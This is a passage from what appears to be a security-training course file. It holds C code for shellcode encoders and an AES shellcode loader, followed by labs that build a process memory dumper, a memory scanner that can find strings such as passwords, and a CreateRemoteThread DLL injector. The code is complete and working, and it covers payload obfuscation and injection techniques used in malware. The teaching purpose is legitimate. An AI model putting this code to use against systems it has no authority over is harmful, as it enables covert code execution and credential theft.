    for (DWORD i = 0; i < shellcodeLen; i++) {
        printf("%02X ", shellcode[i]);
    }
    printf("\\n\\n");
    
    // Generate decoder stub
    printf("Decoder stub (x64 assembly):\\n");
    printf("----------------------------\\n");
    printf("lea rsi, [rel encoded_shellcode]\\n");
    printf("mov ecx, %d              ; Length\\n", shellcodeLen);
    printf("mov al, 0x%02X            ; Key\\n", key);
    printf("decode_loop:\\n");
    printf("    xor byte [rsi], al\\n");
    printf("    inc rsi\\n");
    printf("    loop decode_loop\\n");
    printf("jmp encoded_shellcode    ; Execute!\\n\\n");
    
    printf("encoded_shellcode:\\n");
    printf("    db ");
    for (DWORD i = 0; i < shellcodeLen; i++) {
        printf("0x%02X", shellcode[i]);
        if (i < shellcodeLen - 1) printf(", ");
    }
    printf("\\n\\n");
}

// ENCODER 2: Multi-byte XOR
void MultiByteXorEncode(BYTE* data, DWORD dataLen,
                        BYTE* key, DWORD keyLen) {
    for (DWORD i = 0; i < dataLen; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// ENCODER 3: NOT encoder (flip all bits)
void NotEncode(BYTE* data, DWORD dataLen) {
    for (DWORD i = 0; i < dataLen; i++) {
        data[i] = ~data[i];
    }
}

// ENCODER 4: ADD encoder
void AddEncode(BYTE* data, DWORD dataLen, BYTE key) {
    for (DWORD i = 0; i < dataLen; i++) {
        data[i] = (data[i] + key) & 0xFF;
    }
}

// TECHNIQUE: AES Encryption
#include <wincrypt.h>
#pragma comment(lib, "advapi32.lib")

BOOL AESEncrypt(BYTE* pData, DWORD dwDataLen,
                BYTE* pKey, DWORD dwKeyLen,
                BYTE** ppEncrypted, DWORD* pdwEncLen) {
    
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BOOL bResult = FALSE;
    
    // Acquire context
    if (!CryptAcquireContextA(&hProv, NULL, NULL,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // Create hash of key
    if (!CryptCreateHash(hProv, CALG_SHA_256, 
        0, 0, &hHash)) {
        goto cleanup;
    }
    
    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) {
        goto cleanup;
    }
    
    // Derive AES key
    if (!CryptDeriveKey(hProv, CALG_AES_256, 
        hHash, 0, &hKey)) {
        goto cleanup;
    }
    
    // Allocate output buffer (size + padding)
    DWORD dwEncLen = dwDataLen + 16;  // AES block size
    BYTE* pEncrypted = (BYTE*)malloc(dwEncLen);
    memcpy(pEncrypted, pData, dwDataLen);
    
    // Encrypt
    DWORD dwSize = dwDataLen;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, 
        pEncrypted, &dwSize, dwEncLen)) {
        free(pEncrypted);
        goto cleanup;
    }
    
    *ppEncrypted = pEncrypted;
    *pdwEncLen = dwSize;
    bResult = TRUE;
    
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return bResult;
}

// Complete example: Encrypted shellcode loader
void EncryptedShellcodeExample() {
    // Original shellcode (calc.exe example)
    BYTE shellcode[] = {
        0x90, 0x90, 0x90,  // NOP sled
        // ... actual shellcode
    };
    
    DWORD shellcodeLen = sizeof(shellcode);
    
    // Encryption key
    BYTE key[] = "MySecretKey123!";
    DWORD keyLen = sizeof(key) - 1;
    
    // Encrypt
    BYTE* pEncrypted = NULL;
    DWORD dwEncLen = 0;
    
    if (!AESEncrypt(shellcode, shellcodeLen,
        key, keyLen, &pEncrypted, &dwEncLen)) {
        printf("[-] Encryption failed\\n");
        return;
    }
    
    printf("[+] Encrypted %d bytes -> %d bytes\\n",
           shellcodeLen, dwEncLen);
    
    printf("\\nEncrypted shellcode:\\n");
    printf("    ");
    for (DWORD i = 0; i < dwEncLen; i++) {
        printf("%02X ", pEncrypted[i]);
        if ((i + 1) % 16 == 0) printf("\\n    ");
    }
    printf("\\n");
    
    free(pEncrypted);
}

int main() {
    printf("=== Shellcode Encoders ===\\n\\n");
    
    GenerateXorEncoder();
    
    printf("\\n=== AES Encryption ===\\n\\n");
    EncryptedShellcodeExample();
    
    return 0;
}`,
          language: "c"
        }
      ]
    },
    labs: {
      title: "Practical Labs - Build Real Tools",
      sections: [
        {
          title: "Introduction to Security Tool Development",
          content: `Welcome to the Practical Labs! Here you'll build real security tools step-by-step. These tools are used by security professionals, penetration testers, and red teamers to assess system security.

WHAT YOU'LL BUILD:
1. Process Memory Dumper - Extract process memory for analysis
2. Memory Scanner - Find patterns in process memory
3. Simple DLL Injector - Inject code into running processes

LEGAL & ETHICAL NOTE:
These tools are for educational purposes and legitimate security research only. Use them only on systems you own or have explicit written permission to test. Unauthorized use is illegal.

PREREQUISITES:
• Complete C/C++ WinAPI Fundamentals module
• Understanding of Windows process architecture
• Visual Studio or MinGW-w64 compiler
• Windows SDK installed

DEVELOPMENT ENVIRONMENT:
• OS: Windows 10/11
• Compiler: Visual Studio 2019+ or MinGW-w64
• Debugger: x64dbg or WinDbg
• Administrator privileges required for most operations`,
          code: `// PROJECT SETUP
// =============

// Visual Studio:
// 1. Create new C++ Console Application
// 2. Project Properties -> C/C++ -> General -> Warning Level: /W4
// 3. Project Properties -> Linker -> System -> SubSystem: Console
// 4. Add required libraries in code with #pragma comment

// MinGW-w64:
// gcc tool.c -o tool.exe -lpsapi -ladvapi32 -municode

// Common headers for all labs:
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

// Enable SE_DEBUG_PRIVILEGE for all labs
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hToken)) {
        wprintf(L"[!] OpenProcessToken failed: %lu\\n", 
                GetLastError());
        return FALSE;
    }
    
    if (!LookupPrivilegeValueW(NULL, 
            SE_DEBUG_NAME, &luid)) {
        wprintf(L"[!] LookupPrivilegeValue failed: %lu\\n",
                GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!AdjustTokenPrivileges(hToken, FALSE, 
            &tp, sizeof(tp), NULL, NULL)) {
        wprintf(L"[!] AdjustTokenPrivileges failed: %lu\\n",
                GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        wprintf(L"[!] Not all privileges assigned\\n");
        wprintf(L"[!] Run as Administrator!\\n");
        CloseHandle(hToken);
        return FALSE;
    }
    
    CloseHandle(hToken);
    wprintf(L"[+] SeDebugPrivilege enabled\\n");
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "Lab 1: Process Memory Dumper",
          content: `Build a tool that dumps the entire memory space of a target process to disk for offline analysis. This is essential for malware analysis, memory forensics, and reverse engineering.

HOW IT WORKS:
1. Find target process by name or PID
2. Open process with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
3. Enumerate all memory regions using VirtualQueryEx
4. Read committed, readable memory regions
5. Write regions to individual files with metadata
6. Create a map file describing the memory layout

KEY CONCEPTS:
• Memory regions have different states (MEM_COMMIT, MEM_RESERVE, MEM_FREE)
• Only committed memory contains actual data
• Memory protection flags determine readability
• Virtual address space is sparse - many gaps
• PE image sections (.text, .data, .rdata) appear as separate regions

WHAT YOU'LL LEARN:
• Process enumeration techniques
• Virtual memory traversal
• Memory protection flags
• Error handling for partial reads
• File I/O for binary data`,
          code: `// PROCESS MEMORY DUMPER
// =====================

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

// Find process by name
DWORD FindProcessByName(const wchar_t* procName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, 0);
    
    if (hSnap == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateToolhelp32Snapshot failed\\n");
        return 0;
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    
    if (!Process32FirstW(hSnap, &pe32)) {
        CloseHandle(hSnap);
        return 0;
    }
    
    do {
        if (_wcsicmp(pe32.szExeFile, procName) == 0) {
            CloseHandle(hSnap);
            wprintf(L"[+] Found %s (PID: %lu)\\n",
                    procName, pe32.th32ProcessID);
            return pe32.th32ProcessID;
        }
    } while (Process32NextW(hSnap, &pe32));
    
    CloseHandle(hSnap);
    return 0;
}

// Dump single memory region
BOOL DumpRegion(HANDLE hProc, 
                MEMORY_BASIC_INFORMATION* mbi,
                const wchar_t* outDir,
                DWORD regionNum) {
    
    // Allocate buffer
    BYTE* buffer = (BYTE*)malloc(mbi->RegionSize);
    if (!buffer) {
        wprintf(L"[!] malloc failed\\n");
        return FALSE;
    }
    
    // Read memory
    SIZE_T bytesRead = 0;
    BOOL result = ReadProcessMemory(
        hProc,
        mbi->BaseAddress,
        buffer,
        mbi->RegionSize,
        &bytesRead);
    
    if (!result || bytesRead == 0) {
        free(buffer);
        return FALSE;
    }
    
    // Build filename
    wchar_t filename[MAX_PATH];
    swprintf_s(filename, MAX_PATH,
        L"%s\\\\region_%03lu_0x%016llX.bin",
        outDir, regionNum,
        (ULONGLONG)mbi->BaseAddress);
    
    // Write to file
    HANDLE hFile = CreateFileW(
        filename,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateFile failed: %lu\\n",
                GetLastError());
        free(buffer);
        return FALSE;
    }
    
    DWORD written = 0;
    WriteFile(hFile, buffer, 
              (DWORD)bytesRead, &written, NULL);
    
    CloseHandle(hFile);
    free(buffer);
    
    wprintf(L"[+] Dumped region %lu: 0x%016llX "
            L"[%6lluKB]\\n",
            regionNum,
            (ULONGLONG)mbi->BaseAddress,
            bytesRead / 1024);
    
    return TRUE;
}

// Create memory map file
void CreateMemoryMap(HANDLE hProc, 
                     const wchar_t* outDir) {
    wchar_t mapFile[MAX_PATH];
    swprintf_s(mapFile, MAX_PATH,
        L"%s\\\\memory_map.txt", outDir);
    
    HANDLE hFile = CreateFileW(
        mapFile,
        GENERIC_WRITE,
        0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }
    
    wchar_t header[] = 
        L"MEMORY MAP\\r\\n"
        L"==========\\r\\n\\r\\n"
        L"Base Address        Size      "
        L"State    Protect    Type\\r\\n"
        L"----------------------------------"
        L"----------------------------------\\r\\n";
    
    DWORD written;
    WriteFile(hFile, header, 
              (DWORD)(wcslen(header) * sizeof(wchar_t)),
              &written, NULL);
    
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    
    while (VirtualQueryEx(hProc, addr, 
                          &mbi, sizeof(mbi))) {
        wchar_t line[512];
        swprintf_s(line, 512,
            L"0x%016llX  %8lluKB  "
            L"%-8s %-10s %-10s\\r\\n",
            (ULONGLONG)mbi.BaseAddress,
            (ULONGLONG)mbi.RegionSize / 1024,
            mbi.State == MEM_COMMIT ? L"COMMIT" :
            mbi.State == MEM_RESERVE ? L"RESERVE" :
            L"FREE",
            mbi.Protect == PAGE_EXECUTE ? L"X" :
            mbi.Protect == PAGE_EXECUTE_READ ? L"RX" :
            mbi.Protect == PAGE_EXECUTE_READWRITE ? 
                L"RWX" :
            mbi.Protect == PAGE_READWRITE ? L"RW" :
            mbi.Protect == PAGE_READONLY ? L"R" :
            L"NONE",
            mbi.Type == MEM_IMAGE ? L"IMAGE" :
            mbi.Type == MEM_MAPPED ? L"MAPPED" :
            mbi.Type == MEM_PRIVATE ? L"PRIVATE" :
            L"");
        
        WriteFile(hFile, line,
                  (DWORD)(wcslen(line) * 
                          sizeof(wchar_t)),
                  &written, NULL);
        
        addr = (BYTE*)mbi.BaseAddress + 
               mbi.RegionSize;
    }
    
    CloseHandle(hFile);
    wprintf(L"[+] Memory map created\\n");
}

// Main dump function
BOOL DumpProcess(DWORD pid, 
                 const wchar_t* outDir) {
    // Open process
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProc) {
        wprintf(L"[!] OpenProcess failed: %lu\\n",
                GetLastError());
        wprintf(L"[!] Try running as Admin\\n");
        return FALSE;
    }
    
    wprintf(L"[+] Opened process %lu\\n", pid);
    
    // Create output directory
    CreateDirectoryW(outDir, NULL);
    
    // Enumerate and dump regions
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    DWORD regionNum = 0;
    DWORD dumped = 0;
    
    wprintf(L"[*] Enumerating memory regions...\\n");
    
    while (VirtualQueryEx(hProc, addr, 
                          &mbi, sizeof(mbi))) {
        // Only dump committed, readable memory
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_READWRITE ||
             mbi.Protect == PAGE_EXECUTE_READ ||
             mbi.Protect == PAGE_EXECUTE_READWRITE)) {
            
            if (DumpRegion(hProc, &mbi, 
                          outDir, regionNum)) {
                dumped++;
            }
            regionNum++;
        }
        
        addr = (BYTE*)mbi.BaseAddress + 
               mbi.RegionSize;
    }
    
    wprintf(L"[+] Dumped %lu regions\\n", dumped);
    
    // Create memory map
    CreateMemoryMap(hProc, outDir);
    
    CloseHandle(hProc);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"Process Memory Dumper\\n");
    wprintf(L"=====================\\n\\n");
    
    if (argc != 3) {
        wprintf(L"Usage: %s <process_name> "
                L"<output_dir>\\n", argv[0]);
        wprintf(L"Example: %s notepad.exe "
                L"C:\\\\dumps\\\\notepad\\n", argv[0]);
        return 1;
    }
    
    // Enable debug privilege
    if (!EnableDebugPrivilege()) {
        wprintf(L"[!] Failed to enable "
                L"SeDebugPrivilege\\n");
        return 1;
    }
    
    // Find process
    DWORD pid = FindProcessByName(argv[1]);
    if (pid == 0) {
        wprintf(L"[!] Process not found\\n");
        return 1;
    }
    
    // Dump process
    if (DumpProcess(pid, argv[2])) {
        wprintf(L"\\n[+] Dump complete!\\n");
        return 0;
    }
    
    return 1;
}

// TESTING:
// 1. Compile: cl dumper.c
// 2. Run as Admin: dumper.exe notepad.exe C:\\dumps
// 3. Check output directory for .bin files
// 4. Open memory_map.txt to see layout
// 5. Use hex editor to analyze .bin files`,
          language: "c"
        },
        {
          title: "Lab 2: Memory Scanner",
          content: `Build a tool that searches for byte patterns, strings, or values in process memory. Essential for game hacking, malware analysis, and finding specific data structures.

HOW IT WORKS:
1. Open target process with read access
2. Enumerate readable memory regions
3. Search each region for the specified pattern
4. Report all matches with addresses
5. Support multiple search types (bytes, strings, integers)

KEY CONCEPTS:
• Pattern matching algorithms (naive vs KMP)
• Handling partial reads at page boundaries
• Performance optimization for large address spaces
• Different data representations (hex, string, integer)
• Memory region filtering (skip unreadable/guard pages)

SEARCH TYPES:
• Byte patterns: "48 8B ?? ?? 89" (? = wildcard)
• ASCII strings: "password"
• Wide strings: L"password"
• Integers: Find DWORD value 1234
• Floats: Find health/ammo values

WHAT YOU'LL LEARN:
• Efficient memory scanning techniques
• Pattern matching with wildcards
• String encoding detection
• Performance optimization
• Result filtering and display`,
          code: `// MEMORY SCANNER
// ==============

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

// Pattern matching with wildcards
BOOL MatchPattern(const BYTE* data, 
                  const BYTE* pattern,
                  const BYTE* mask,
                  SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        if (mask[i] && data[i] != pattern[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

// Search for pattern in buffer
void SearchBuffer(const BYTE* buffer,
                  SIZE_T bufSize,
                  LPVOID baseAddr,
                  const BYTE* pattern,
                  const BYTE* mask,
                  SIZE_T patternSize,
                  DWORD* matchCount) {
    
    for (SIZE_T i = 0; 
         i <= bufSize - patternSize; 
         i++) {
        
        if (MatchPattern(&buffer[i], 
                        pattern, 
                        mask, 
                        patternSize)) {
            
            LPVOID matchAddr = 
                (BYTE*)baseAddr + i;
            
            wprintf(L"[+] Found at: 0x%016llX\\n",
                    (ULONGLONG)matchAddr);
            
            // Print context (16 bytes)
            wprintf(L"    ");
            for (SIZE_T j = 0; j < 16 && 
                 i + j < bufSize; j++) {
                wprintf(L"%02X ", buffer[i + j]);
            }
            wprintf(L"\\n");
            
            (*matchCount)++;
        }
    }
}

// Scan process memory for pattern
DWORD ScanProcess(HANDLE hProc,
                  const BYTE* pattern,
                  const BYTE* mask,
                  SIZE_T patternSize) {
    
    DWORD totalMatches = 0;
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    
    wprintf(L"[*] Scanning memory...\\n\\n");
    
    while (VirtualQueryEx(hProc, addr, 
                          &mbi, sizeof(mbi))) {
        
        // Only scan committed, readable memory
        if (mbi.State == MEM_COMMIT &&
            mbi.Protect != PAGE_NOACCESS &&
            mbi.Protect != PAGE_GUARD &&
            !(mbi.Protect & PAGE_GUARD)) {
            
            // Allocate buffer
            BYTE* buffer = (BYTE*)malloc(
                mbi.RegionSize);
            
            if (buffer) {
                SIZE_T bytesRead = 0;
                
                if (ReadProcessMemory(
                        hProc,
                        mbi.BaseAddress,
                        buffer,
                        mbi.RegionSize,
                        &bytesRead) && 
                    bytesRead > 0) {
                    
                    // Search buffer
                    SearchBuffer(
                        buffer,
                        bytesRead,
                        mbi.BaseAddress,
                        pattern,
                        mask,
                        patternSize,
                        &totalMatches);
                }
                
                free(buffer);
            }
        }
        
        addr = (BYTE*)mbi.BaseAddress + 
               mbi.RegionSize;
    }
    
    return totalMatches;
}

// Parse hex pattern string
// Format: "48 8B ?? ?? 89" (? = wildcard)
BOOL ParseHexPattern(const wchar_t* str,
                     BYTE** outPattern,
                     BYTE** outMask,
                     SIZE_T* outSize) {
    
    // Count bytes
    SIZE_T count = 0;
    const wchar_t* p = str;
    while (*p) {
        if (*p != L' ') count++;
        while (*p && *p != L' ') p++;
        while (*p == L' ') p++;
    }
    count /= 2;
    
    if (count == 0) return FALSE;
    
    *outPattern = (BYTE*)malloc(count);
    *outMask = (BYTE*)malloc(count);
    *outSize = count;
    
    // Parse bytes
    p = str;
    SIZE_T idx = 0;
    
    while (*p && idx < count) {
        while (*p == L' ') p++;
        
        if (p[0] == L'?' && p[1] == L'?') {
            // Wildcard
            (*outPattern)[idx] = 0;
            (*outMask)[idx] = 0;
            p += 2;
        } else {
            // Hex byte
            wchar_t hex[3] = {p[0], p[1], 0};
            (*outPattern)[idx] = 
                (BYTE)wcstoul(hex, NULL, 16);
            (*outMask)[idx] = 1;
            p += 2;
        }
        
        idx++;
    }
    
    return TRUE;
}

// Search for ASCII string
DWORD ScanForString(HANDLE hProc,
                    const char* str) {
    SIZE_T len = strlen(str);
    return ScanProcess(
        hProc,
        (const BYTE*)str,
        (const BYTE*)memset(
            malloc(len), 1, len),
        len);
}

// Search for wide string
DWORD ScanForWideString(HANDLE hProc,
                        const wchar_t* str) {
    SIZE_T len = wcslen(str) * 
                 sizeof(wchar_t);
    
    BYTE* mask = (BYTE*)malloc(len);
    memset(mask, 1, len);
    
    return ScanProcess(
        hProc,
        (const BYTE*)str,
        mask,
        len);
}

// Search for DWORD value
DWORD ScanForDword(HANDLE hProc,
                   DWORD value) {
    BYTE mask[4] = {1, 1, 1, 1};
    return ScanProcess(
        hProc,
        (const BYTE*)&value,
        mask,
        sizeof(DWORD));
}

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"Memory Scanner\\n");
    wprintf(L"==============\\n\\n");
    
    if (argc < 4) {
        wprintf(L"Usage:\\n");
        wprintf(L"  %s <pid> bytes "
                L"<pattern>\\n", argv[0]);
        wprintf(L"  %s <pid> string "
                L"<text>\\n", argv[0]);
        wprintf(L"  %s <pid> wide "
                L"<text>\\n", argv[0]);
        wprintf(L"  %s <pid> dword "
                L"<value>\\n", argv[0]);
        wprintf(L"\\nExamples:\\n");
        wprintf(L"  %s 1234 bytes "
                L"\\"48 8B ?? ?? 89\\"\\n", argv[0]);
        wprintf(L"  %s 1234 string "
                L"password\\n", argv[0]);
        wprintf(L"  %s 1234 dword "
                L"1000\\n", argv[0]);
        return 1;
    }
    
    DWORD pid = wcstoul(argv[1], NULL, 10);
    const wchar_t* type = argv[2];
    const wchar_t* search = argv[3];
    
    // Enable debug privilege
    EnableDebugPrivilege();
    
    // Open process
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProc) {
        wprintf(L"[!] OpenProcess failed: %lu\\n",
                GetLastError());
        return 1;
    }
    
    wprintf(L"[+] Opened process %lu\\n", pid);
    wprintf(L"[*] Search type: %s\\n", type);
    wprintf(L"[*] Pattern: %s\\n\\n", search);
    
    DWORD matches = 0;
    
    if (wcscmp(type, L"bytes") == 0) {
        BYTE* pattern;
        BYTE* mask;
        SIZE_T size;
        
        if (ParseHexPattern(search, 
                           &pattern, 
                           &mask, &size)) {
            matches = ScanProcess(hProc, 
                                 pattern, 
                                 mask, size);
            free(pattern);
            free(mask);
        }
    }
    else if (wcscmp(type, L"string") == 0) {
        // Convert to ASCII
        char str[256];
        wcstombs_s(NULL, str, 256, 
                   search, _TRUNCATE);
        matches = ScanForString(hProc, str);
    }
    else if (wcscmp(type, L"wide") == 0) {
        matches = ScanForWideString(
            hProc, search);
    }
    else if (wcscmp(type, L"dword") == 0) {
        DWORD value = wcstoul(
            search, NULL, 10);
        matches = ScanForDword(hProc, value);
    }
    
    wprintf(L"\\n[+] Found %lu matches\\n", 
            matches);
    
    CloseHandle(hProc);
    return 0;
}

// TESTING:
// 1. Open notepad.exe, type "secret123"
// 2. Get PID from Task Manager
// 3. Run: scanner.exe <pid> string secret123
// 4. Try: scanner.exe <pid> bytes "48 8B"
// 5. Try: scanner.exe <pid> dword 1000`,
          language: "c"
        },
        {
          title: "Lab 3: Simple DLL Injector",
          content: `Build a tool that injects a DLL into a running process using the classic CreateRemoteThread technique. This is the foundation for process hooking, game modding, and security testing.

HOW IT WORKS:
1. Open target process with full access
2. Allocate memory in target for DLL path
3. Write DLL path to allocated memory
4. Get address of LoadLibraryW in kernel32.dll
5. Create remote thread calling LoadLibraryW with DLL path
6. Wait for thread to complete
7. Clean up allocated memory

KEY CONCEPTS:
• Kernel32.dll is mapped at the same address in all processes
• LoadLibraryW address is thus valid across processes
• CreateRemoteThread executes code in target context
• DLL_PROCESS_ATTACH runs in target process
• Thread handle must be waited on and closed

SECURITY CONSIDERATIONS:
• Requires PROCESS_ALL_ACCESS permissions
• May be blocked by antivirus (false positive)
• Protected processes cannot be injected
• DEP/ASLR doesn't prevent this technique
• Modern games use anti-cheat to detect this

WHAT YOU'LL LEARN:
• Remote memory allocation
• Cross-process function calls
• DLL loading mechanics
• Thread synchronization
• Error handling and cleanup`,
          code: `// DLL INJECTOR
// ============

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Inject DLL into process
BOOL InjectDLL(DWORD pid, 
               const wchar_t* dllPath) {
    
    wprintf(L"[*] Target PID: %lu\\n", pid);
    wprintf(L"[*] DLL: %s\\n\\n", dllPath);
    
    // Verify DLL exists
    if (GetFileAttributesW(dllPath) == 
        INVALID_FILE_ATTRIBUTES) {
        wprintf(L"[!] DLL not found\\n");
        return FALSE;
    }
    
    // Open target process
    wprintf(L"[*] Opening process...\\n");
    
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProc) {
        wprintf(L"[!] OpenProcess failed: %lu\\n",
                GetLastError());
        wprintf(L"[!] Try running as Admin\\n");
        return FALSE;
    }
    
    wprintf(L"[+] Process opened\\n");
    
    // Allocate memory in target
    SIZE_T pathSize = (wcslen(dllPath) + 1) * 
                      sizeof(wchar_t);
    
    wprintf(L"[*] Allocating memory "
            L"(%zu bytes)...\\n", pathSize);
    
    LPVOID pRemoteBuf = VirtualAllocEx(
        hProc,
        NULL,
        pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    
    if (!pRemoteBuf) {
        wprintf(L"[!] VirtualAllocEx failed: "
                L"%lu\\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] Memory allocated at: "
            L"0x%p\\n", pRemoteBuf);
    
    // Write DLL path to target
    wprintf(L"[*] Writing DLL path...\\n");
    
    SIZE_T written = 0;
    BOOL result = WriteProcessMemory(
        hProc,
        pRemoteBuf,
        dllPath,
        pathSize,
        &written);
    
    if (!result || written != pathSize) {
        wprintf(L"[!] WriteProcessMemory failed: "
                L"%lu\\n", GetLastError());
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] DLL path written "
            L"(%zu bytes)\\n", written);
    
    // Get LoadLibraryW address
    wprintf(L"[*] Getting LoadLibraryW "
            L"address...\\n");
    
    HMODULE hKernel32 = GetModuleHandleW(
        L"kernel32.dll");
    
    if (!hKernel32) {
        wprintf(L"[!] GetModuleHandle failed\\n");
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    LPVOID pLoadLibrary = (LPVOID)
        GetProcAddress(hKernel32, 
                       "LoadLibraryW");
    
    if (!pLoadLibrary) {
        wprintf(L"[!] GetProcAddress failed\\n");
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] LoadLibraryW at: 0x%p\\n",
            pLoadLibrary);
    
    // Create remote thread
    wprintf(L"[*] Creating remote thread...\\n");
    
    HANDLE hThread = CreateRemoteThread(
        hProc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteBuf,
        0,
        NULL);
    
    if (!hThread) {
        wprintf(L"[!] CreateRemoteThread failed: "
                L"%lu\\n", GetLastError());
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] Remote thread created\\n");
    wprintf(L"[*] Waiting for thread...\\n");
    
    // Wait for thread to complete
    WaitForSingleObject(hThread, INFINITE);
    
    // Get thread exit code (HMODULE of loaded DLL)
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    
    if (exitCode == 0) {
        wprintf(L"[!] DLL failed to load\\n");
        wprintf(L"[!] Check DLL architecture "
                L"matches process\\n");
    } else {
        wprintf(L"[+] DLL loaded! HMODULE: "
                L"0x%08lX\\n", exitCode);
    }
    
    // Cleanup
    wprintf(L"[*] Cleaning up...\\n");
    CloseHandle(hThread);
    VirtualFreeEx(hProc, pRemoteBuf, 
                  0, MEM_RELEASE);
    CloseHandle(hProc);
    
    wprintf(L"[+] Injection complete!\\n");
    return exitCode != 0;
}

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"Simple DLL Injector\\n");
    wprintf(L"===================\\n\\n");
    
    if (argc != 3) {
        wprintf(L"Usage: %s <pid> <dll_path>\\n",
                argv[0]);
        wprintf(L"Example: %s 1234 "
                L"C:\\\\test.dll\\n", argv[0]);
        return 1;
    }
    
    DWORD pid = wcstoul(argv[1], NULL, 10);
    const wchar_t* dllPath = argv[2];
    
    // Enable debug privilege
    if (!EnableDebugPrivilege()) {
        wprintf(L"[!] Failed to enable "
                L"SeDebugPrivilege\\n");
        return 1;
    }
    
    // Convert to absolute path
    wchar_t fullPath[MAX_PATH];
    GetFullPathNameW(dllPath, MAX_PATH, 
                     fullPath, NULL);
    
    // Inject DLL
    if (InjectDLL(pid, fullPath)) {
        wprintf(L"\\n[+] Success!\\n");
        return 0;
    }
    
    wprintf(L"\\n[!] Injection failed\\n");
    return 1;
}

// SAMPLE DLL CODE
// ===============

/*
// Save as test_dll.c
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD reason,
                      LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // This runs in target process!
        
        // Show message box
        MessageBoxW(NULL,
            L"DLL Injected Successfully!",
            L"Injection Test",
            MB_OK | MB_ICONINFORMATION);
        
        // Or create a thread
        CreateThread(NULL, 0,
            MyThreadFunc, NULL, 0, NULL);
        
        // Or hook APIs
        // HookFunction(...);
    }
    
    return TRUE;
}

// Compile DLL:
// cl /LD test_dll.c /link 
//    /DEF:exports.def

// exports.def:
EXPORTS
    DllMain
*/

// TESTING:
// 1. Compile injector: cl injector.c
// 2. Compile test DLL (see above)
// 3. Start notepad.exe
// 4. Get PID from Task Manager
// 5. Run: injector.exe <pid> test_dll.dll
// 6. Message box should appear in notepad

// TROUBLESHOOTING:
// • "Failed to load": Wrong architecture 
//   (x86 DLL in x64 process)
// • "Access denied": Run as Administrator
// • No message box: Check DllMain code
// • Crashes: Verify DLL exports correctly`,
          language: "c"
        },
        {
          title: "Next Steps & Advanced Techniques",
          content: `Congratulations! You've built three fundamental security tools. Here's how to take your skills further:

ADVANCED INJECTION TECHNIQUES:
• Manual Mapping - Bypass LoadLibrary detection by manually mapping PE
• Reflective DLL Injection - DLL loads itself without touching disk
